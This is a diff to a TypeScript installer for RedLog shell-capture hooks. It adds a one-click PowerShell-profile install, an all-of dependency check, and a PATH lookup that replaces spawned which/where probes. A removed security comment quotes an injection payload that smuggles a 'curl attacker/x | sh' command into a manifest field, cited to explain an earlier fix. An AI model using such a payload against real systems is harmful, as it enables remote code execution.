@@ -1,9 +1,11 @@
-import { execSync, spawn, spawnSync } from 'child_process'
 import { existsSync, readFileSync, writeFileSync, mkdirSync, copyFileSync } from 'fs'
 import { dirname, join } from 'path'
 import { homedir } from 'os'
 import { bundledRoot } from './plugins/loader'
+import { isOnPath } from './command-lookup'
 import { isDisabled } from './plugins/state'
+
+export type InstallMethod = 'claude-settings' | 'shell-source' | 'powershell-profile' | 'manual'
 
 export interface PluginManifest {
   id: string
@@ -12,11 +14,15 @@ export interface PluginManifest {
   agentType: string
   /** E3: event subtypes this producer emits under agentType (see CaptureContribution.emits). */
   emits?: string[]
+  /** Any-of alternatives: available when at least one is on PATH. */
   requires: string[]
+  /** All-of runtime dependencies: unavailable while any one is missing
+   *  (the POSIX adapters build events with python3 and send them with curl). */
+  requiresAll?: string[]
   hookFile: string
   /** Files installed beside hookFile, such as a shared shell transport. */
   supportFiles?: string[]
-  installMethod: 'claude-settings' | 'shell-source' | 'manual'
+  installMethod: InstallMethod
   installTarget?: string
   shellRcFile?: string
   claudeSettingsMatcher?: string
@@ -42,9 +48,9 @@ export interface PluginInfo {
   emits?: string[]
   installed: boolean
   available: boolean
-  installMethod: 'claude-settings' | 'shell-source' | 'manual'
+  installMethod: InstallMethod
   hookFile: string
-  /** for installMethod 'manual': ordered, copy-paste setup steps */
+  /** for installMethod 'manual' (and the powershell-profile fallback): ordered, copy-paste setup steps */
   manualSteps?: ManualStep[]
 }
 
@@ -66,6 +72,7 @@ export const STARTER_PACK_FALLBACK: PluginManifest[] = [
     description: 'Captures commands and exit codes from zsh',
     agentType: 'shell',
     requires: [],
+    requiresAll: ['python3', 'curl'],
     hookFile: 'hooks/shell-zsh-hook.zsh',
     supportFiles: ['hooks/shell-common.sh', 'hooks/redlog-session.py'],
     installMethod: 'shell-source',
@@ -78,6 +85,7 @@ export const STARTER_PACK_FALLBACK: PluginManifest[] = [
     description: 'Captures commands via preexec/precmd hooks',
     agentType: 'shell',
     requires: [],
+    requiresAll: ['python3', 'curl'],
     hookFile: 'hooks/shell-bash-hook.sh',
     supportFiles: ['hooks/shell-common.sh', 'hooks/redlog-session.py'],
     installMethod: 'shell-source',
@@ -109,7 +117,8 @@ export const STARTER_PACK_FALLBACK: PluginManifest[] = [
     agentType: 'shell',
     requires: [],
     hookFile: 'hooks/shell-hook.ps1',
-    installMethod: 'manual'
+    installMethod: 'powershell-profile',
+    installTarget: join(homedir(), '.redlog', 'shell-hook.ps1')
   },
   {
     id: 'shell-wsl',
@@ -149,6 +158,7 @@ function loadStarterPack(): PluginManifest[] | null {
         description: typeof e.description === 'string' ? e.description : '',
         agentType: e.agentType,
         requires: Array.isArray(e.requires) ? (e.requires as string[]) : [],
+        requiresAll: Array.isArray(e.requiresAll) ? (e.requiresAll as string[]) : undefined,
         hookFile: e.hookFile,
         supportFiles: Array.isArray(e.supportFiles) ? (e.supportFiles as string[]) : undefined,
         installMethod: e.installMethod as PluginManifest['installMethod'],
@@ -251,54 +261,25 @@ function shellRcFor(plugin: PluginManifest): string {
   return process.env.SHELL?.includes('zsh') ? '.zshrc' : '.bashrc'
 }
 
-// Per-command lookup cache.  `where.exe` on Windows costs 70-300ms per call
-// (PATH walk + PATHEXT expansion), and the answer virtually never changes
-// during a session.  Cache indefinitely; `invalidateCommandCache()` resets
-// after an install/uninstall so the next `detectHooks()` re-probes.
+// Per-command lookup cache. The answer virtually never changes during a
+// session; `invalidateCommandCache()` resets it after an install/uninstall so
+// the next `detectHooks()` re-probes.
 const _cmdCache = new Map<string, boolean>()
 export function invalidateCommandCache(): void { _cmdCache.clear() }
 
+// A PATH lookup, not a spawned `which` / `where`: one process per probe cost
+// hundreds of milliseconds on Windows, on the main thread (command-lookup.ts).
+// The name comes from a manifest's `requires[]` and is never interpreted.
 function commandExists(cmd: string): boolean {
   const hit = _cmdCache.get(cmd)
   if (hit !== undefined) return hit
-  // v0.6.93 P0-B: was `execSync(`which ${cmd}`)` — the plugin manifest's
-  // `requires[]` string flows into a shell, so a malicious manifest like
-  // `requires: ["nmap; curl attacker/x | sh #"]` executes arbitrary shell.
-  // spawnSync with explicit argv keeps the string as one process argument
-  // and never touches a shell.
-  try {
-    const probeCmd = process.platform === 'win32' ? 'where' : 'which'
-    const result = spawnSync(probeCmd, [cmd], { stdio: 'ignore' })
-    const found = result.status === 0
-    _cmdCache.set(cmd, found)
-    return found
-  } catch {
-    _cmdCache.set(cmd, false)
-    return false
-  }
+  const found = isOnPath(cmd)
+  _cmdCache.set(cmd, found)
+  return found
 }
 
 function commandExistsAsync(cmd: string): Promise<boolean> {
-  const hit = _cmdCache.get(cmd)
-  if (hit !== undefined) return Promise.resolve(hit)
-  return new Promise((resolve) => {
-    try {
-      const probeCmd = process.platform === 'win32' ? 'where' : 'which'
-      const child = spawn(probeCmd, [cmd], { stdio: 'ignore' })
-      child.on('close', (code) => {
-        const found = code === 0
-        _cmdCache.set(cmd, found)
-        resolve(found)
-      })
-      child.on('error', () => {
-        _cmdCache.set(cmd, false)
-        resolve(false)
-      })
-    } catch {
-      _cmdCache.set(cmd, false)
-      resolve(false)
-    }
-  })
+  return Promise.resolve(commandExists(cmd))
 }
 
 function isClaudeSettingsInstalled(matcher: string): boolean {
@@ -331,18 +312,55 @@ function matcherFor(plugin: PluginManifest): string {
   return plugin.claudeSettingsMatcher ?? (plugin._dir ? (plugin.hookFile.split(/[\\/]/).pop() ?? plugin.id) : plugin.id)
 }
 
+// PowerShell loads a different profile per edition: Windows PowerShell 5.1
+// (always present on Windows) and PowerShell 7 (`pwsh`). Documents may be
+// redirected (OneDrive); these are the default locations shell/install.ps1's
+// `$PROFILE` resolves to on a stock install.
+export function powershellProfilePaths(home: string = homedir()): { windowsPowerShell: string; pwsh: string } {
+  return {
+    windowsPowerShell: join(home, 'Documents', 'WindowsPowerShell', 'Microsoft.PowerShell_profile.ps1'),
+    pwsh: join(home, 'Documents', 'PowerShell', 'Microsoft.PowerShell_profile.ps1')
+  }
+}
+
+// The line the one-click install appends. `$HOME` is resolved by PowerShell at
+// load time, so the profile stays valid if the account's home moves.
+const PS_PROFILE_MARKER = '# RedLog PowerShell hook'
+function psProfileLine(hookName: string): string {
+  return `. "$HOME\\.redlog\\${hookName}"`
+}
+
+function isPowershellProfileInstalled(hookPath: string): boolean {
+  if (!existsSync(hookPath)) return false
+  const hookName = hookPath.split(/[\\/]/).pop() ?? ''
+  const needle = `.redlog\\${hookName}`
+  return Object.values(powershellProfilePaths()).some((profile) => {
+    try { return existsSync(profile) && readFileSync(profile, 'utf-8').includes(needle) } catch { return false }
+  })
+}
+
 function checkInstalled(plugin: PluginManifest): boolean {
   switch (plugin.installMethod) {
     case 'claude-settings':
       return isClaudeSettingsInstalled(matcherFor(plugin))
     case 'shell-source':
       return isShellSourceInstalled(plugin.shellRcFile ?? '.zshrc', installTargetFor(plugin))
+    case 'powershell-profile':
+      return isPowershellProfileInstalled(installTargetFor(plugin))
     case 'manual':
       return false
   }
 }
 
+// An adapter whose runtime dependency is missing is not available, whatever
+// its any-of `requires` say: a zsh hook without python3 installs cleanly and
+// then never records a thing.
+function missingRequiredAll(plugin: PluginManifest): boolean {
+  return (plugin.requiresAll ?? []).some((cmd) => !commandExists(cmd))
+}
+
 function checkAvailable(plugin: PluginManifest): boolean {
+  if (missingRequiredAll(plugin)) return false
   if (plugin.requires.length === 0) {
     if (plugin.id === 'shell-powershell') return process.platform === 'win32'
     if (plugin.id === 'shell-wsl') {
@@ -359,6 +377,7 @@ function checkAvailable(plugin: PluginManifest): boolean {
 }
 
 async function checkAvailableAsync(plugin: PluginManifest): Promise<boolean> {
+  if (missingRequiredAll(plugin)) return false
   if (plugin.requires.length === 0) {
     if (plugin.id === 'shell-powershell') return process.platform === 'win32'
     if (plugin.id === 'shell-wsl') {
@@ -455,10 +474,16 @@ function buildManualSteps(pluginId: string, hookFile: string): ManualStep[] | un
   }
 }
 
+// The PowerShell profile install is one click, but its copy-paste steps stay
+// as the fallback for a redirected Documents folder or a locked-down profile.
+function hasManualSteps(plugin: PluginManifest): boolean {
+  return plugin.installMethod === 'manual' || plugin.installMethod === 'powershell-profile'
+}
+
 export function detectHooks(): PluginInfo[] {
   return allManifests().map((plugin) => {
     const hookFile = srcPathFor(plugin)
-    const manualSteps = plugin.installMethod === 'manual'
+    const manualSteps = hasManualSteps(plugin)
       ? (plugin.manualSteps ?? buildManualSteps(plugin.id, hookFile))
       : undefined
 
@@ -483,7 +508,7 @@ export async function detectHooksAsync(): Promise<PluginInfo[]> {
   const manifests = allManifests()
   const results = await Promise.all(manifests.map(async (plugin) => {
     const hookFile = srcPathFor(plugin)
-    const manualSteps = plugin.installMethod === 'manual'
+    const manualSteps = hasManualSteps(plugin)
       ? (plugin.manualSteps ?? buildManualSteps(plugin.id, hookFile))
       : undefined
     return {
@@ -578,6 +603,37 @@ export function installHook(pluginId: string): { success: boolean; message: stri
         return { success: false, message: `Failed: ${e}` }
       }
     }
+    case 'powershell-profile': {
+      // Mirrors shell/install.ps1: copy the hook under ~/.redlog, then append
+      // the dot-source line to the profile(s) — idempotently.
+      if (process.platform !== 'win32') {
+        return { success: false, message: `${plugin.name}: one-click install is only supported on Windows.` }
+      }
+      const dest = installTargetFor(plugin)
+      try {
+        const src = srcPathFor(plugin)
+        if (!existsSync(src)) throw new Error(`Missing hook file: ${src}`)
+        mkdirSync(dirname(dest), { recursive: true })
+        copyFileSync(src, dest)
+        const hookName = dest.split(/[\\/]/).pop()!
+        const line = psProfileLine(hookName)
+        const profiles = powershellProfilePaths()
+        const targets = [profiles.windowsPowerShell, ...(commandExists('pwsh') ? [profiles.pwsh] : [])]
+        for (const profile of targets) {
+          mkdirSync(dirname(profile), { recursive: true })
+          const content = existsSync(profile) ? readFileSync(profile, 'utf-8') : ''
+          if (content.includes(`.redlog\\${hookName}`)) continue
+          const sep = content.length === 0 || content.endsWith('\n') ? '' : '\r\n'
+          writeFileSync(profile, `${content}${sep}${PS_PROFILE_MARKER}\r\n${line}\r\n`)
+        }
+        return { success: true, message: `${plugin.name} hook installed. Open a new PowerShell window, or run: . $PROFILE` }
+      } catch (e) {
+        return {
+          success: false,
+          message: `Failed: ${e}. Manual fallback: add  . "${dest}"  to your PowerShell $PROFILE.`
+        }
+      }
+    }
     case 'manual':
       return { success: false, message: `Manual setup required for ${plugin.name}` }
   }
@@ -618,6 +674,21 @@ export function uninstallHook(pluginId: string): { success: boolean; message: st
           writeFileSync(rcPath, content)
         }
         return { success: true, message: `${plugin.name} hook removed. Run: source ~/${rcFile}` }
+      } catch (e) {
+        return { success: false, message: `Failed: ${e}` }
+      }
+    }
+    case 'powershell-profile': {
+      try {
+        const hookName = installTargetFor(plugin).split(/[\\/]/).pop()!
+        const needle = `.redlog\\${hookName}`
+        for (const profile of Object.values(powershellProfilePaths())) {
+          if (!existsSync(profile)) continue
+          const lines = readFileSync(profile, 'utf-8').split(/\r?\n/)
+          const kept = lines.filter((l) => !l.includes(needle) && l.trim() !== PS_PROFILE_MARKER)
+          if (kept.length !== lines.length) writeFileSync(profile, kept.join('\r\n'))
+        }
+        return { success: true, message: `${plugin.name} hook removed. Open a new PowerShell window.` }
       } catch (e) {
         return { success: false, message: `Failed: ${e}` }
       }
